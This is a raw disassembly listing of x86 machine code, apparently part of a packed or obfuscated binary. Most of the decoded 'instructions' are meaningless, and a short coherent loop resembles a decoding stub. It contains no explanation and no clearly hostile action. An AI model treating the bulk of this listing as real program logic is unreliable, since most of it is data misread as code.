  40f3a2:	das    
  40f3a3:	pop    esi
  40f3a4:	fdivp  st(1),st
  40f3a6:	jnp    0x40f3d3
  40f3a8:	(bad)  
  40f3a9:	pop    eax
  40f3aa:	addr16 pop ds
  40f3ac:	cmp    BYTE PTR [eax+0x46aef4a6],dh
  40f3b2:	mov    dl,BYTE PTR [ebp-0x41437754]
  40f3b8:	in     eax,dx
  40f3b9:	adc    ch,BYTE PTR [eax+0x4d6b3f86]
  40f3bf:	push   es
  40f3c0:	mov    ebx,0x67762a66
  40f3c5:	pop    ecx
  40f3c6:	push   0x6d
  40f3c8:	adc    al,ch
  40f3ca:	(bad)  
  40f3cb:	mov    ds:0xc5cb5b25,al
  40f3d0:	fadd   DWORD PTR [ebx]
  40f3d3:	push   edx
  40f3d4:	out    dx,al
  40f3d5:	sbb    esi,esi
  40f3d7:	mov    ebp,0x4f7e927b
  40f3dc:	xchg   ecx,eax
  40f3dd:	loope  0x40f44c
  40f3df:	sub    al,0x83
  40f3e1:	jae    0x40f3db
  40f3e3:	push   ebx
  40f3e4:	and    dh,bl
  40f3e6:	push   es
  40f3e7:	mov    ah,0x1d
  40f3e9:	push   cs
  40f3ea:	inc    edx
  40f3eb:	loope  0x40f40f
  40f3ed:	mov    BYTE PTR [edx+0x5d],al
  40f3f0:	jg     0x40f43c
  40f3f2:	and    ecx,DWORD PTR ds:0xe287e64
  40f3f8:	mov    ecx,0x4d6e3a67
  40f3fd:	and    eax,0xb6bf21f0
  40f402:	fsubrp st(3),st
  40f404:	mov    ss,WORD PTR [eax]
  40f406:	add    eax,0xde681328
  40f40b:	mov    ds,ebx
  40f40d:	out    0xb7,al
  40f40f:	bound  esp,QWORD PTR ds:[ebx-0x26f56ea9]
  40f416:	pop    es
  40f417:	mov    edi,0xe8af3b9d
  40f41c:	test   al,0x8f
  40f41e:	push   DWORD PTR [eax+0x5f0cae97]
  40f424:	mov    ds:0xf2f5287,eax
  40f429:	cmp    edx,edi
  40f42b:	lods   al,BYTE PTR ds:[esi]
  40f42c:	mov    bl,BYTE PTR [esi-0x4321dd98]
  40f432:	or     DWORD PTR [ebx],eax
  40f434:	lods   al,BYTE PTR ds:[esi]
  40f435:	or     al,BYTE PTR [edx+0x2734440c]
  40f43b:	(bad)  
  40f43c:	icebp  
  40f43d:	push   ebp
  40f43e:	mov    WORD PTR [ecx],ds
  40f440:	fsub   st(6),st
  40f442:	addr16 jo 0x40f44c
  40f445:	sti    
  40f446:	and    ebx,DWORD PTR [ecx]
  40f448:	xor    DWORD PTR [ebp+0x60473621],esp
  40f44e:	mov    ch,0xf7
  40f450:	fst    DWORD PTR [ecx]
  40f452:	jno    0x4adb9881
  40f458:	mov    ecx,0xeec9add1
  40f45d:	pop    edx
  40f45e:	xchg   edx,eax
  40f45f:	add    al,0x5f
  40f461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f462:	pusha  
  40f463:	hlt    
  40f464:	(bad)  
  40f465:	jle    0x40f4d4
  40f467:	cmp    ch,BYTE PTR [esi+eiz*8-0x36]
  40f46b:	fwait
  40f46c:	mov    dl,0x53
  40f46e:	xor    al,0x72
  40f470:	push   esp
  40f471:	cmp    eax,0x4aae0b7b
  40f476:	jne    0x40f46c
  40f478:	xchg   edx,eax
  40f479:	push   ebp
  40f47a:	xbegin 0xa75deb9b
  40f480:	cli    
  40f481:	add    DWORD PTR [ebp+0x749b9093],ebx
  40f487:	icebp  
  40f488:	pop    esp
  40f489:	jle    0x40f41d
  40f48b:	dec    edx
  40f48c:	mov    esi,0xfb8bd218
  40f491:	fdiv   DWORD PTR [esp+eiz*8]
  40f494:	(bad)  
  40f495:	mov    edi,0x9a5ec546
  40f49a:	outs   dx,BYTE PTR ds:[esi]
  40f49b:	aas    
  40f49c:	xor    eax,0x5124b3af
  40f4a1:	mov    ebp,0xa5cac79d
  40f4a6:	xlat   BYTE PTR ds:[ebx]
  40f4a7:	outs   dx,BYTE PTR ds:[esi]
  40f4a8:	xor    al,0x22
  40f4aa:	push   eax
  40f4ab:	cmp    DWORD PTR [edi],ebp
  40f4ad:	add    eax,0x232de4af
  40f4b2:	dec    eax
  40f4b3:	test   DWORD PTR [edx-0x52df7f44],ecx
  40f4b9:	or     eax,0xb64d5834
  40f4be:	out    0x5e,al
  40f4c0:	hlt    
  40f4c1:	jl     0x40f471
  40f4c3:	mov    ebx,0xc2fffe28
  40f4c8:	xor    al,0x88
  40f4ca:	cli    
  40f4cb:	aam    0x9b
  40f4cd:	xchg   ecx,eax
  40f4ce:	xchg   ch,dh
  40f4d0:	add    BYTE PTR [edx],dl
  40f4d2:	mov    ecx,0x88594fc1
  40f4d7:	jne    0x40f4a9
  40f4d9:	xor    eax,0xfe42b69c
  40f4de:	es jo  0x40f4c1
  40f4e1:	jmp    0x49852b3c
  40f4e6:	mov    ds:0x5cb654f1,al
  40f4eb:	adc    cl,dh
  40f4ed:	test   eax,0xf70f52c6
  40f4f2:	(bad)  
  40f4f3:	aaa    
  40f4f4:	in     al,0x6b
  40f4f6:	call   0x85176588
  40f4fb:	inc    esi
  40f4fc:	lods   al,BYTE PTR ds:[esi]
  40f4fd:	xlat   BYTE PTR ds:[ebx]
  40f4fe:	push   edi
  40f4ff:	test   BYTE PTR [esi-0x37a8e6a2],dl
  40f505:	push   0x5a943043
  40f50a:	xor    ch,ah
  40f50c:	pushf  
  40f50d:	in     al,0xa5
  40f50f:	sahf   
  40f510:	push   esp
  40f511:	pusha  
  40f512:	mov    ebp,0x4f885fee
  40f517:	sahf   
  40f518:	jge    0x40f4e5
  40f51a:	xchg   ecx,eax
  40f51b:	stos   DWORD PTR es:[edi],eax
  40f51c:	adc    BYTE PTR [esi-0x49],0x45
  40f520:	data16 jle 0x40f4cd
  40f523:	mov    ds:0x4ae7d579,al
  40f528:	sub    bl,BYTE PTR [esi+0x7e]
  40f52b:	cld    
  40f52c:	mov    WORD PTR [eax-0x429a0ebc],ss
  40f532:	mov    edi,ebx
  40f534:	mov    al,0xe1
  40f536:	xchg   ebp,eax
  40f537:	in     eax,dx
  40f538:	mov    BYTE PTR [edx],al
  40f53a:	(bad)  
  40f53b:	shl    BYTE PTR [edx+0x5800d6b9],1
  40f541:	mov    al,0x1d
  40f543:	jb     0x40f5c1
  40f545:	(bad)  
  40f546:	shl    bh,1
  40f548:	mov    dl,0x4c
  40f54a:	rcr    ch,0x3e
  40f54d:	shl    BYTE PTR [edx+0xf44db22],1
  40f553:	in     eax,0xb6
  40f555:	pop    ecx
  40f556:	xor    BYTE PTR [edx],bl
  40f558:	mov    ch,0x2b
  40f55a:	scas   al,BYTE PTR es:[edi]
  40f55b:	adc    eax,0xf6e08976
  40f560:	or     al,0x28
  40f562:	ins    BYTE PTR es:[edi],dx
  40f563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f564:	cmp    ch,BYTE PTR [edx+eiz*8+0x44d520aa]
  40f56b:	xlat   BYTE PTR ds:[ebx]
  40f56c:	stos   DWORD PTR es:[edi],eax
  40f56d:	enter  0x5b61,0xec
  40f571:	scas   al,BYTE PTR es:[edi]
  40f572:	and    edi,esi
  40f574:	mov    ds,edi
  40f576:	aad    0xfa
  40f578:	sbb    DWORD PTR [edi],eax
  40f57a:	pop    ebx
  40f57b:	sub    al,0xec
  40f57d:	das    
  40f57e:	jmp    0x54ccd441
  40f583:	test   eax,0x64dc1bd9
  40f588:	clc    
  40f589:	ins    DWORD PTR es:[edi],dx
  40f58a:	repnz inc eax
  40f58c:	(bad)  
  40f58d:	sbb    dh,BYTE PTR [ecx+edi*8]
  40f590:	mov    fs,WORD PTR [ecx-0x6e898465]
  40f596:	push   0xf4fd9c3a
  40f59b:	cmp    DWORD PTR [esi+0x70abf89b],ebx
  40f5a1:	sub    al,0xf9
  40f5a3:	dec    ebp
  40f5a4:	mov    eax,0xc15bf4f7
  40f5a9:	imul   DWORD PTR [edx-0x111240a8]
  40f5af:	gs pop ebp
  40f5b1:	add    eax,0x80738c1c
  40f5b6:	mov    esp,0x2d994a8b
  40f5bb:	xor    DWORD PTR [ebp+0x79],ebx
  40f5be:	adc    BYTE PTR [esi-0x14541c0d],dl
  40f5c4:	xchg   cl,bh
  40f5c6:	jmp    0x40f55c
  40f5c8:	idiv   BYTE PTR [esi+0x26569678]
  40f5ce:	call   0x3c38:0x138017aa
  40f5d5:	inc    edx
  40f5d6:	inc    ecx
  40f5d7:	retf   
  40f5d8:	xor    edi,esi
  40f5da:	cmp    al,0x7d
  40f5dc:	stc    
  40f5dd:	or     edx,edi
  40f5df:	cmp    esi,eax
  40f5e1:	repz jle 0x40f576
  40f5e4:	loop   0x40f59c
  40f5e6:	sar    dl,1
  40f5e8:	callw  0x4d31
  40f5ec:	add    al,0x1a
  40f5ee:	rcl    edi,0xf4
  40f5f1:	mov    edi,0xc71d90aa
  40f5f6:	ja     0x40f600
  40f5f8:	mov    ebx,0x4b13056
  40f5fd:	rcr    DWORD PTR ds:0xeaf8a190,1
  40f603:	mul    DWORD PTR [ecx+0x646f8b0c]
  40f609:	sti    
  40f60a:	dec    esi
  40f60b:	cwde   
  40f60c:	inc    esp
  40f60d:	into   
  40f60e:	mov    ah,cl
  40f610:	jp     0x40f63b
  40f612:	(bad)  
  40f614:	repnz fwait
  40f616:	rcr    BYTE PTR [edi-0x455a9c3a],cl
  40f61c:	mov    eax,DWORD PTR [edi-0x3e]
  40f61f:	aad    0x12
  40f621:	arpl   WORD PTR [ebx],cx
  40f623:	lahf   
  40f624:	lock pushf 
  40f626:	rcr    ebp,0x2a
  40f629:	add    al,0x5e
  40f62b:	pusha  
  40f62c:	jecxz  0x40f603
  40f62e:	(bad)
  40f633:	cmp    ch,BYTE PTR [esi-0x11]
  40f636:	ret    
  40f637:	lock mov DWORD PTR [eax+0x5f],esp
  40f63b:	mov    bl,0x90
  40f63d:	adc    bl,bl
  40f63f:	sar    BYTE PTR [esi+0x7b],1
  40f642:	(bad)  
  40f643:	cwde   
  40f644:	push   0x31
  40f646:	bound  edx,QWORD PTR [ebp-0x47]
  40f649:	mov    eax,0x717c5b1e
  40f64e:	int    0xc6
  40f650:	or     al,0xff
  40f652:	inc    edx
  40f653:	pop    ebp
  40f654:	push   es
  40f655:	sub    al,0x3e
  40f657:	xchg   BYTE PTR [ecx],bh
  40f659:	icebp  
  40f65a:	aaa    
  40f65b:	mov    al,0xe9
  40f65d:	(bad)  
  40f65e:	cmp    edi,DWORD PTR [eax+0x68066e87]
  40f664:	ins    BYTE PTR es:[edi],dx
  40f665:	pushf  
  40f666:	xchg   esi,eax
  40f667:	sbb    edx,edi
  40f669:	ret    
  40f66a:	test   al,0x6d
  40f66c:	test   eax,0x4b837c49
  40f671:	sbb    al,0xb8
  40f673:	pop    ecx
  40f674:	adc    esp,ebx
  40f676:	fld    TBYTE PTR [esp+ebx*2+0x68]
  40f67a:	ins    DWORD PTR es:[edi],dx
  40f67b:	(bad)  
  40f67c:	imul   BYTE PTR [ebx+0x6]
  40f67f:	fisubr DWORD PTR ss:[ecx+0x7d]
  40f683:	outs   dx,DWORD PTR ds:[esi]
  40f684:	xchg   ebp,eax
  40f685:	or     eax,0x2098f31
  40f68a:	addr16 imul edx,ecx,0x552b86fe
  40f691:	lods   eax,DWORD PTR ds:[esi]
  40f692:	test   DWORD PTR gs:[ebx+0x60],esp
  40f696:	sti    
  40f697:	or     ah,BYTE PTR [ebx+0x2c307d31]
  40f69d:	mov    ds:0xb58cff6a,eax
  40f6a2:	out    dx,eax
  40f6a3:	lds    esi,FWORD PTR [ebx-0x75]
  40f6a6:	add    BYTE PTR [ecx-0x142efe22],0xa2
  40f6ad:	mov    eax,0x9e47b366
  40f6b2:	daa    
  40f6b3:	xlat   BYTE PTR ds:[ebx]
  40f6b4:	test   DWORD PTR [edi],edx
  40f6b6:	lock outs dx,BYTE PTR ds:[esi]
  40f6b8:	fcmovnbe st,st(0)
  40f6ba:	dec    eax
  40f6bb:	or     DWORD PTR [edx],eax
  40f6bd:	fld    TBYTE PTR [esi+0x4c6b0a88]
  40f6c3:	inc    esp
  40f6c4:	or     eax,0x83f5c366
  40f6c9:	and    dl,cl
  40f6cb:	mov    ds:0x1c26925e,eax
  40f6d0:	add    DWORD PTR [ecx+0x4d0fc10b],ecx
  40f6d6:	lds    edx,FWORD PTR [ecx]
  40f6d8:	sbb    al,0x3b
  40f6da:	mov    edi,0x4f761052
  40f6df:	mov    al,0x50
  40f6e1:	mov    ebx,0x48bd6d6
  40f6e6:	mov    dl,BYTE PTR [ebp-0x663dc52a]
  40f6ec:	push   ecx
  40f6ed:	imul   esp,DWORD PTR [eax],0xfffffffb
  40f6f0:	in     al,dx
  40f6f1:	jmp    0x40f684
  40f6f3:	sub    eax,0xa20e3056
  40f6f8:	jmp    0xa1a7408e
  40f6fd:	aad    0xc9
  40f6ff:	adc    edx,DWORD PTR [ebp+0x4e]
  40f702:	inc    edx
  40f703:	fwait
  40f704:	xor    bl,BYTE PTR [edx-0x35dcdc54]
  40f70a:	fwait
  40f70b:	popf   
  40f70c:	or     BYTE PTR [edi],bl
  40f70e:	push   0xffffffeb
  40f710:	inc    ebx
  40f711:	shl    DWORD PTR [ebp-0x49625acb],0x4b
  40f718:	sbb    BYTE PTR [edi],0xfc
  40f71b:	aad    0x9
  40f71d:	xchg   ebx,eax
  40f71e:	int3   
  40f71f:	(bad)  
  40f721:	daa    
  40f722:	inc    BYTE PTR [ecx-0x620b4c28]
  40f728:	je     0x40f795
  40f72a:	mov    cl,0xbc
  40f72c:	sbb    al,BYTE PTR [esi+0x8435f22]
  40f732:	mov    esp,0x7ea4605
  40f737:	jno    0x40f6ed
  40f739:	and    DWORD PTR [edx],0xffffffb4
  40f73c:	stc    
  40f73d:	(bad)  
  40f73e:	and    DWORD PTR [eax-0x30],esi
  40f741:	jmp    0xc93:0x17763cbd
  40f748:	es cwde 
  40f74a:	stos   BYTE PTR es:[edi],al
  40f74b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f74c:	shr    BYTE PTR [ecx],1
  40f74e:	sar    bh,1
  40f750:	adc    ch,BYTE PTR [edx]
  40f752:	(bad)  
  40f753:	dec    ebp
  40f754:	pop    es
  40f755:	xchg   esp,eax
  40f756:	mov    ebx,0x6bab9d08
  40f75b:	sbb    bl,cl
  40f75d:	repnz loope 0x40f743
  40f760:	mov    gs,WORD PTR [eax-0x6ff7475f]
  40f766:	mov    esi,0x2fb3afa6
  40f76b:	addr16 dec esp
  40f76d:	into   
  40f76e:	jp     0x40f74c
  40f770:	pop    esp
  40f771:	or     DWORD PTR [ecx],0x2d18569b
  40f777:	mov    dl,BYTE PTR [ecx-0x53]
  40f77a:	retf   0x447f
  40f77d:	ins    BYTE PTR es:[edi],dx
  40f77e:	push   edx
  40f77f:	or     DWORD PTR [ecx-0x7f59371e],edi
  40f785:	out    0xcc,eax
  40f787:	clc    
  40f788:	shl    BYTE PTR [eax+0x118f8e3d],1
  40f78e:	in     eax,dx
  40f78f:	ds or  eax,0xa959519c
  40f795:	pop    ds
  40f796:	inc    esp
  40f797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f798:	cmp    DWORD PTR ds:0xd11050e0,esi
  40f79e:	add    DWORD PTR [ebp-0x70],esp
  40f7a1:	(bad)  
  40f7a2:	shl    bh,1
  40f7a4:	arpl   di,di
  40f7a6:	pushf  
  40f7a7:	sti    
  40f7a8:	pushf  
  40f7a9:	lods   eax,DWORD PTR ds:[esi]
  40f7aa:	mov    cl,0xe0
  40f7ac:	and    al,0x8b
  40f7ae:	or     dl,BYTE PTR [ecx+0x50dc38b4]
  40f7b4:	mov    edi,0x8841c307
  40f7b9:	fdivr  QWORD PTR [ecx]
  40f7bb:	or     esi,DWORD PTR [eiz*4+0x1dd6b7c3]
  40f7c2:	push   edx
  40f7c3:	push   0xb3b93755
  40f7c8:	or     BYTE PTR [ecx+0x7],dl
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x430a38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0xa4aae090
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	(bad)  
  40f871:	pop    ebx
  40f872:	sub    edx,DWORD PTR [edi]
  40f874:	mov    ch,BYTE PTR [edx-0x6e]
  40f877:	cwde   
  40f878:	jmp    0x5ec4:0x402fe79b
  40f87f:	jmp    0x40f878
  40f881:	cld    
  40f882:	je     0x40f863
  40f884:	sar    esi,cl
  40f886:	push   edx
  40f887:	jle    0x40f836
  40f889:	dec    esp
  40f88a:	ins    BYTE PTR es:[edi],dx
  40f88b:	lahf   
  40f88c:	push   edi
  40f88d:	hlt    
  40f88e:	scas   al,BYTE PTR es:[edi]
  40f88f:	pop    edi
  40f890:	adc    al,0x61
  40f892:	lods   al,BYTE PTR ds:[esi]
  40f893:	sar    dh,1
  40f895:	push   edx
  40f896:	jnp    0x40f878
  40f898:	test   al,0x1c
  40f89a:	(bad)  
  40f89b:	dec    esi
  40f89c:	mov    ds:0x22e30668,eax
  40f8a1:	push   eax
  40f8a2:	(bad)  
  40f8a3:	dec    ebp
  40f8a4:	into   
  40f8a5:	jp     0x40f918
  40f8a7:	jns    0x40f91a
  40f8a9:	int3   
  40f8aa:	test   DWORD PTR [edi],esp
  40f8ac:	adc    eax,0xa078560
  40f8b1:	int    0xfa
  40f8b3:	stos   BYTE PTR es:[edi],al
  40f8b4:	pop    edx
  40f8b5:	push   0x4f
  40f8b7:	mov    al,0x60
  40f8b9:	outs   dx,BYTE PTR ds:[esi]
  40f8ba:	je     0x40f900
  40f8bc:	dec    edi
  40f8bd:	and    al,0x7a
  40f8bf:	aam    0x9e
  40f8c1:	or     al,0x3f
  40f8c3:	xor    DWORD PTR [ebp+esi*8+0x79],edx
  40f8c7:	mov    bl,0x9e
  40f8c9:	pop    ecx
  40f8ca:	mov    eax,0xb281326a
  40f8cf:	sub    al,BYTE PTR [esi+0x2cc53608]
  40f8d5:	clc    
  40f8d6:	hlt    
  40f8d7:	fsub   DWORD PTR [ebp-0x13]
  40f8da:	lods   eax,DWORD PTR ds:[esi]
  40f8db:	cmp    DWORD PTR [ebx],esi
  40f8dd:	inc    ecx
  40f8de:	js     0x40f885
  40f8e0:	jb     0x40f929
  40f8e2:	popa   
  40f8e3:	jmp    0x40f8c3
  40f8e5:	pop    eax
  40f8e6:	jp     0x40f95a
  40f8e8:	inc    edi
  40f8e9:	les    esp,FWORD PTR [edx+0x45ae8c08]
  40f8ef:	xchg   esp,eax
  40f8f0:	sbb    esi,edx
  40f8f2:	test   cl,bh
  40f8f4:	int    0xf8
  40f8f6:	mov    WORD PTR [edx],?
  40f8f8:	sub    eax,0x1a90a7c8
  40f8fd:	nop
  40f8fe:	mov    edi,0xc14ac1f7
  40f903:	nop
  40f904:	lds    edx,FWORD PTR [esi+0x28]
  40f907:	xor    cl,BYTE PTR [ebx]
  40f909:	and    eax,DWORD PTR [edx-0x400b3ac1]
  40f90f:	dec    ecx
  40f910:	dec    edx
  40f911:	repz adc eax,0xc80a1d4d
  40f917:	cmp    BYTE PTR ds:[esi+0x6e7b8b30],bl
  40f91e:	jge    0x40f8ac
  40f920:	mov    ch,cl
  40f922:	xor    cl,BYTE PTR [ebp+0x6b]
  40f925:	dec    ebp
  40f926:	pop    ecx
  40f927:	or     BYTE PTR [esi*1-0x56938f54],dl
  40f92e:	(bad)  
  40f92f:	stc    
  40f930:	add    cl,BYTE PTR [eax]
  40f932:	into   
  40f933:	adc    DWORD PTR [esi-0x71032e8e],ebp
  40f939:	xor    dl,BYTE PTR [esi+0xd4a196]
  40f93f:	sub    DWORD PTR [esi-0x62],esp
  40f942:	inc    ecx
  40f943:	add    edi,DWORD PTR [ecx-0x736dcf54]
  40f949:	jmp    0xe81fd35f
  40f94e:	cmp    eax,0x14acdf39
  40f953:	cld    
  40f954:	dec    ebx
  40f955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f956:	dec    ecx
  40f957:	aad    0x8b
  40f959:	outs   dx,DWORD PTR ds:[esi]
  40f95a:	pop    eax
  40f95b:	retf   
  40f95c:	mov    eax,ecx
  40f95e:	(bad)  
  40f95f:	leave  
  40f960:	sar    BYTE PTR [eax+0x3c904336],0xea
  40f967:	lea    edi,[edi+eax*4]
  40f96a:	daa    
  40f96b:	clc    
  40f96c:	shl    esi,0xb3
  40f96f:	inc    edi
  40f970:	xchg   ecx,eax
  40f971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f972:	xchg   ebx,eax
  40f973:	mov    edi,0x6a8afe7d
  40f978:	in     eax,dx
  40f979:	out    dx,eax
  40f97a:	std    
  40f97b:	arpl   WORD PTR [eax+0x6244427c],dx
  40f981:	push   ecx
  40f982:	jb     0x40f997
  40f984:	pop    ss
  40f985:	sub    DWORD PTR [esi-0x3c116b35],ebp
  40f98b:	xchg   ecx,eax
  40f98c:	ins    BYTE PTR es:[edi],dx
  40f98d:	inc    esi
  40f98e:	test   DWORD PTR [ecx-0x1c],edx
  40f991:	pop    edi
  40f992:	sahf   
  40f993:	je     0x40f97e
  40f995:	pop    eax
  40f996:	ins    DWORD PTR es:[edi],dx
  40f997:	mov    dh,0x54
  40f999:	dec    ebx
  40f99a:	mov    cl,0x9e
  40f99c:	mov    DWORD PTR [ebx-0x3b],eax
  40f99f:	mov    bl,0x8a
  40f9a1:	lods   eax,DWORD PTR ds:[esi]
  40f9a2:	dec    esi
  40f9a3:	mov    ah,0x6
  40f9a5:	dec    eax
  40f9a6:	mov    dh,0x30
  40f9a8:	xchg   ebp,eax
  40f9a9:	gs out 0x4,al
  40f9ac:	rol    esi,0x6e
  40f9af:	ins    BYTE PTR es:[edi],dx
  40f9b0:	test   DWORD PTR [esi-0x7640064d],esp
  40f9b6:	leave  
  40f9b7:	stc    
  40f9b8:	or     DWORD PTR [edx],ecx
  40f9ba:	push   cs
  40f9bb:	call   0xced7:0x8497b601
  40f9c2:	xor    al,0xf2
  40f9c4:	sbb    eax,0xa47e92f6
  40f9c9:	add    DWORD PTR [ebx],esi
  40f9cb:	adc    DWORD PTR [edi],ecx
  40f9cd:	cmp    eax,0xe1d34d8e
  40f9d2:	cmp    DWORD PTR [edx+0x44],eax
  40f9d5:	mov    ds:0x6de8deb3,al
  40f9da:	mov    bl,0xed
  40f9dc:	jnp    0x40f9e5
  40f9de:	addr16 iret 
  40f9e0:	inc    edi
  40f9e1:	leave  
  40f9e2:	pop    ebp
  40f9e3:	sub    DWORD PTR [esi+eiz*2+0x38],0x1fb6292e
  40f9eb:	xor    al,BYTE PTR [ecx+ebp*4-0x6c02df7c]
  40f9f2:	add    al,0xf8
  40f9f4:	or     eax,esi
  40f9f6:	and    al,0xb5
  40f9f8:	fidivr WORD PTR [ecx+0x7303507]
  40f9fe:	leave  
  40f9ff:	lds    eax,FWORD PTR [edi]
  40fa01:	dec    ecx
  40fa02:	das    
  40fa03:	mov    edi,0x65b738
  40fa08:	retf   
  40fa09:	xor    ah,dh
  40fa0b:	dec    edx
  40fa0c:	xlat   BYTE PTR ds:[ebx]
  40fa0d:	je     0x40fa28
  40fa0f:	iret   
  40fa10:	xor    eax,0xb158c67b
  40fa15:	imul   eax,DWORD PTR ds:0xaf6731eb,0x3d89bbc6
  40fa1f:	cmp    esi,eax
  40fa21:	mov    dh,0x4
  40fa23:	cmp    al,0x16
  40fa25:	jmp    0x40fa48
  40fa27:	push   eax
  40fa28:	inc    edi
  40fa29:	nop
  40fa2a:	mov    bl,BYTE PTR [edx]
  40fa2c:	retf   
  40fa2d:	sbb    bl,BYTE PTR [esi+0x51]
  40fa30:	es std 
  40fa32:	fistp  DWORD PTR [eax+0x3]
  40fa35:	popa   
  40fa36:	mov    eax,ds:0xbd7f4ca6
  40fa3b:	push   ebp
  40fa3c:	push   ebp
  40fa3d:	call   0x7e0b:0x1d65462b
  40fa44:	hlt    
  40fa45:	sbb    BYTE PTR [esp+ebp*1],0x13
  40fa49:	dec    esp
  40fa4a:	retf   
  40fa4b:	mov    WORD PTR [ecx-0x14],cs
  40fa4e:	or     dh,dl
  40fa50:	push   0xffffff93
  40fa52:	retf   0x2bed
  40fa55:	mov    ds:0x2b2a1145,eax
  40fa5a:	push   ebp
  40fa5b:	jo     0x40fadc
  40fa5d:	sbb    eax,0x46b6fdfc
  40fa62:	fidiv  WORD PTR [esp+edx*1-0x2499e28e]
  40fa69:	das    
  40fa6a:	jae    0x40f9ee
  40fa6c:	lock and al,0xec
  40fa6f:	outs   dx,BYTE PTR ds:[esi]
  40fa70:	out    dx,eax
  40fa71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa72:	int3   
  40fa73:	das    
  40fa74:	pop    eax
  40fa75:	leave  
  40fa76:	pop    es
  40fa77:	dec    edx
  40fa78:	loope  0x40fa22
  40fa7a:	div    bh
  40fa7c:	lea    ebx,[edi+0xe2b0bf3]
  40fa82:	xchg   ecx,edx
  40fa84:	add    cl,BYTE PTR [edx*8+0x49d10a97]
  40fa8b:	fld    DWORD PTR [ebx+0x69]
  40fa8e:	jne    0x40fa6a
  40fa90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa91:	xchg   ebx,eax
  40fa92:	push   0xfffffffc
  40fa94:	pop    es
  40fa95:	rcr    eax,0x39
  40fa98:	sbb    al,0x7c
  40fa9a:	xchg   edi,eax
  40fa9b:	add    ecx,esi
  40fa9d:	inc    ebp
  40fa9e:	(bad)  
  40fa9f:	or     DWORD PTR [eax],esi
  40faa1:	nop
  40faa2:	mov    ?,WORD PTR [eax]
  40faa4:	pop    eax
  40faa5:	jne    0x40fa61
  40faa7:	leave  
  40faa8:	dec    eax
  40faa9:	nop
  40faaa:	jmp    0xaeed:0xa6850961
  40fab1:	dec    esi
  40fab2:	ror    BYTE PTR [eax-0x6c],cl
  40fab5:	mov    ch,0xa2
  40fab7:	(bad)
  40fabb:	sub    BYTE PTR cs:[eax-0x70],bl
  40fabf:	xchg   edi,eax
  40fac0:	dec    ecx
  40fac1:	loope  0x40fab4
  40fac3:	mov    edx,DWORD PTR [esi+0x14d98b1e]
  40fac9:	rcl    BYTE PTR ds:0xc7de55c4,cl
  40facf:	sub    eax,DWORD PTR [ecx+esi*8-0x40]
  40fad3:	push   ebp
  40fad4:	(bad)  
  40fad5:	loopne 0x40faab
  40fad7:	or     eax,0x853b7fb0
  40fadc:	shr    DWORD PTR [ebp+0x4a5104be],1
  40fae2:	shl    esp,0xca
  40fae5:	mov    esi,0xb875e71b
  40faea:	dec    eax
  40faeb:	pop    edi
  40faec:	jmp    0x40faf8
  40faee:	sub    edi,edi
  40faf0:	outs   dx,BYTE PTR ds:[esi]
  40faf1:	call   0xc349:0x60d8fdce
  40faf8:	mov    DWORD PTR es:[eax],eax
  40fafb:	mov    al,0x13
  40fafd:	out    dx,eax
  40fafe:	mov    esi,0xa157450f
  40fb03:	mov    bh,0xa8
  40fb05:	push   ds
  40fb06:	fcmovbe st,st(1)
  40fb08:	adc    dl,bh
  40fb0a:	jne    0x40fb58
  40fb0c:	in     eax,dx
  40fb0d:	aaa    
  40fb0e:	pop    esp
  40fb0f:	adc    ah,dh
  40fb11:	sbb    BYTE PTR [esi-0x72],al
  40fb14:	xor    bl,ch
  40fb16:	cmp    ah,dl
  40fb18:	stos   BYTE PTR es:[edi],al
  40fb19:	aam    0x6d
  40fb1b:	ret    0xa1da
  40fb1e:	push   ecx
  40fb1f:	sbb    dh,BYTE PTR [edx+0x3e6aa84f]
  40fb25:	pop    edx
  40fb26:	inc    esp
  40fb27:	ja     0x40fb47
  40fb29:	xor    DWORD PTR [ecx],ebx
  40fb2b:	fsubr  st(3),st
  40fb2d:	nop
  40fb2e:	es sti 
  40fb30:	ins    DWORD PTR es:[edi],dx
  40fb31:	and    ebx,DWORD PTR es:[eax+0x49e7ef79]
  40fb38:	lea    edx,[ebx+0x69]
  40fb3b:	sub    cl,BYTE PTR [ecx]
  40fb3d:	adc    BYTE PTR [ebx-0x3a38b8d7],0x81
  40fb44:	aas    
  40fb45:	out    dx,al
  40fb46:	push   ss
  40fb47:	xor    esp,DWORD PTR [ecx+0x29]
  40fb4a:	ret    
